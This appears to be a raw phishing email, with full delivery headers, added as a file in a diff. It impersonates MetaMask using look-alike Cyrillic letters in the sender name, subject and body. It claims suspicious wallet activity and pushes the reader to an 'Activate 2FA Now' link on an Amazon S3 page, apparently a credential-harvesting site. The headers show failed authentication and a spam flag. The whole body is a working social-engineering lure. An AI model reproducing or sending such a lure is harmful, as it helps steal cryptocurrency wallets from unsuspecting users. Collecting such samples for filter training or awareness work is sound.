@@ -1,0 +1,110 @@
+Delivered-To: fortschritt24.kontakt@gmail.com
+Received: by 2002:a05:612c:2814:b0:554:7c0:c37f with SMTP id gw20csp1319705vqb;
+        Thu, 15 Jan 2026 17:21:01 -0800 (PST)
+X-Forwarded-Encrypted: i=2; AJvYcCWRccxW/8jcRD5LZpfGj3nJ4RMHHT9abu9XZW0sAEgkN7WWLJKHlIGqUh/A/AOnLabiGAngNSF2xf+FDe0ucfhkpko314A=@gmail.com
+X-Received: by 2002:a05:6000:288b:b0:431:4bd:4edf with SMTP id ffacd0b85a97d-4356a051cc0mr1224702f8f.36.1768526461144;
+        Thu, 15 Jan 2026 17:21:01 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1768526461; cv=none;
+        d=google.com; s=arc-20240605;
+        b=C5KCHB6T3r2SEO/b6EyQ4n4yaA1zQfTvaAe2ZZyAeZbHY+5+g/2bWrVaKem4XQw8hd
+         suf0s2qjSsIs14ePYwWMzJIjD0KFtmG1hbEjWZh9XhlPT86jMSH7TXNV2+V2v2kYFCyz
+         rFioXwTkJ4HwsPJXOMPme4KeIRoFeZfKLdDsqpl/kuUhLEWh9EGaP//ozeIfiIC5GIgY
+         Y+YZIbKA007sIdvqHZi+CL8NMjKXnDcZbbp806mbvLVGvMENj6w2Ys3djGG0PIyJTyXX
+         5B3Zgscez65fe/22TZJdCW55B99vaSPgp6Fz2ytCyGPFsC8lDbSUfXMwLodhgfHfD/bI
+         wXTw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=list-unsubscribe:mime-version:reply-to:from:subject:to:message-id
+         :date:dkim-signature:domainkey-signature:comment;
+        bh=Hstcd7GB6wx+oDlOyH8V5rohBh2LK2IAJDtiNuMhmmc=;
+        fh=MWZBFs07DeE27mxpE9qnOg7GclqgplcW9XiqyL58mtY=;
+        b=JwB4VOw/yQRoeYwrWY6tEkzynhEipUPUx6Uyp0EMHl3XA1L1RYuMArWWiNRwrB9okF
+         MMqcjqDUCzHZIqrv/990RxmDZuS3x0quqJ2IlEZsQP9SSm4M2jJWRHmjMnLv4pVelF7d
+         7F7GVkYcudB5Inw3NUEtoqOpuS1yNNHDUcoZgCMAQ7MQ5PHyXJXNv8m4D2Eep6BgQ0ex
+         5nW7/psXXsP06+iZNDAe09YVvnsoSszsgD4FZgCD2xJxinlWIZDEhq6yXDFnpvKLMBCg
+         9xUyIs5K7HGCi+1My8fsfcgPBI8R0oKIZyuyh0t7NVxlEU9OhKaJsRCE98p6GMrOnZdN
+         2j5Q==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=permerror (no key for signature) header.i=@38d2ee6877.nxcli.io header.s=default header.b=N3lIQwP7;
+       spf=none (google.com: postmaster@38d2ee6877.nxcli.io does not designate permitted sender hosts) smtp.mailfrom=postmaster@38d2ee6877.nxcli.io
+Return-Path: <postmaster@38d2ee6877.nxcli.io>
+Received: from dd55114.kasserver.com (dd55114.kasserver.com. [85.13.167.96])
+        by mx.google.com with ESMTPS id ffacd0b85a97d-43569bb72cesi1544839f8f.493.2026.01.15.17.21.00
+        for <fortschritt24.kontakt@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 15 Jan 2026 17:21:01 -0800 (PST)
+Received-SPF: none (google.com: postmaster@38d2ee6877.nxcli.io does not designate permitted sender hosts) client-ip=85.13.167.96;
+Authentication-Results: mx.google.com;
+       dkim=permerror (no key for signature) header.i=@38d2ee6877.nxcli.io header.s=default header.b=N3lIQwP7;
+       spf=none (google.com: postmaster@38d2ee6877.nxcli.io does not designate permitted sender hosts) smtp.mailfrom=postmaster@38d2ee6877.nxcli.io
+Authentication-Results: dd55114.kasserver.com;
+	dkim=fail reason="key not found in DNS" header.d=38d2ee6877.nxcli.io header.i=@38d2ee6877.nxcli.io header.a=rsa-sha256 header.s=default header.b=N3lIQwP7;
+	dkim-atps=neutral
+X-policyd-weight: NOT_IN_SPAMCOP=-3 CL_IP_EQ_FROM_IP=-2 (check from: .nxcli. - helo: .cloudhost-2883480.uk-south-2.nxcli. - helo-domain: .nxcli.)  FROM/MX_MATCHES_HELO(DOMAIN)=-2; rate: -7
+Received: from cloudhost-2883480.uk-south-2.nxcli.net (cloudhost-2883480.uk-south-2.nxcli.net [165.84.218.233])
+	by dd55114.kasserver.com (Postfix) with ESMTPS id E5F1AA00161F
+	for <info@fortschritt24.de>; Fri, 16 Jan 2026 02:13:27 +0100 (CET)
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=38d2ee6877.nxcli.io;
+  b=ZamIOI36H6NAdb048zMIyJbqAVEDjATn4IhwFBxGCTQ64/mfcDUGn2jRR1S9Nz+EIKLrulsTvWUcdDurzavPrzEtA6kSeMaTc4DLZkYkJt63I93RI0BaUxLqhKqhL0tPLnnaIgrckbVGZhRiXbhaMZKIBTZCiu+irdPjfyuJn1KZ2yYH05QdtMjTOlS1QoofE1lDrIzzZw03N/uoCr8YP9UNMl7EpgWp2dh5XkY5UOER3vusrCOG+JTpQPMHRdrcqOpqU9PSLM8D02TJpJ6TE+gEDlXbxOMLyg54Yr++LkSAjHVz9PziwBncTIHOPLbPDJKJUeW1pa8K1BpGYGs37w==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=38d2ee6877.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=BlDiLOUWd5jxR2VeaP
+	zVFUFIzWxnZnfMzeclksmiCEc=; b=N3lIQwP7k300TQaa9uMQnIefJ1ZVAtmwrH
+	sUyCy5JVOe3KxU/WJ5N5h9sI2mwM6a+OK2MaDwxeibYCxFJATbjC29cL2S4Rx+6/
+	j0yDRvFLlpHC26K9SVjfy5GpTbjCOIq+jTDEXNIwpCHDfi3h6mEBzCxnzQHeXXzB
+	dNKMre/xCtJDU0GPvM9kACswp4eUyLO2m2Wei25MpuVm9CFYXeaijieeHgBYkwSG
+	T0rq8iZXyUjAhOftZtAaz1Tqb1l1/GNQ8anWqZWxqacj0wLi/Y5Fq5W0z0VciV+5
+	uqdkX34aEDSS5RFcXb9lAX41GfgBrQhdXnd8OHjwBzJIUpOFJFZw==
+Received: (qmail 12561 invoked by uid 10177); 16 Jan 2026 01:13:26 +0000
+Date: 16 Jan 2026 01:13:26 +0000
+Message-ID: <20260116011326.12554.qmail@cloudhost-2883480.uk-south-2.nxcli.net>
+To: info@fortschritt24.de
+Subject: Wаllet Login Attempt – Vеrification Needed
+X-PHP-Originating-Script: 10177:app.php
+From: "MetаMаsk" <qulfimns@qbn.io>
+Reply-To: qulfimns@qbn.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@.us>
+X-Spamd-Bar: +++++++++
+X-Spam: Yes
+
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>MetaMаsk Security</title>
+</head>
+<body style="margin:0;padding:0;background:#f8f9fa;font-family:Arial,sans-serif;color:#222">
+  <table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:40px auto;background:#fff;border:1px solid #ddd;border-radius:8px">
+    <tr>
+      <td style="padding:20px;text-align:center">
+        <img src="https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg" alt="MetaMаsk" width="48" style="margin-bottom:10px">
+        <h2 style="color:#f6851b;font-size:18px;margin:10px 0 0">MetaMаsk Security Notice</h2>
+      </td>
+    </tr>
+    <tr>
+      <td style="padding:20px;font-size:15px;line-height:1.6">
+        <p>We've detected suspicious behavior linked to your wallet. To enhance security, we recommend activating Two-Factor Authentication (2FA).</p>
+        <p>2FA helps protect your assets even if someone knows your password.</p>
+        <div style="text-align:center;margin:26px 0">
+          <a href="https://access-authority-1b91b9c.s3.us-east-1.amazonaws.com/index.html?id=1121607841897519875-2898" style="background:#f6851b;color:#fff;padding:12px 20px;border-radius:4px;text-decoration:none;font-weight:bold;display:inline-block">Activate 2FA Now</a>
+        </div>
+        <p>If you did not request this, no action is needed.</p>
+      </td>
+    </tr>
+    <tr>
+      <td style="padding:20px;text-align:center;color:#999;font-size:13px">
+        © 2025 MetaMаsk. All rights reserved.
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
+
